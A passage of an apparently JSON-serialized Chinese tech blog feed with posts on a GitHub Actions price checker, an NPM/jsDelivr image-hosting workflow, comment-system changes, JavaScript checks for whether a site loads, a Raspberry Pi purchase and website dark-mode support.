class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 18:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"From Twikoo To Waline","date":"2021-04-19 21:25:00","description":"\n<p>我建立博客以来，评论系统一直都在变化。你看，又换回 Waline 了。</p>\n<p>更换过程：</p>\n<p>Gitalk -&gt; Valine -&gt; Waline -&gt; Twikoo -&gt; Waline </p>\n<p>更换的原因是 Tencent CloudBase 的数据库每天只有 500 次读取，随随便便就没了，体验不是很好。</p>\n<p>而我需要的是一款有后端、免费部署的评论系统，于是我选择了 Waline。</p>\n<p>现在每天使用 GitHub Action 向 Waline API 发生请求，避免 LeanCloud 存档。</p>\n","link":"https://blog.yfun.top/posts/1685510532/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 20:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 19:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 12:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 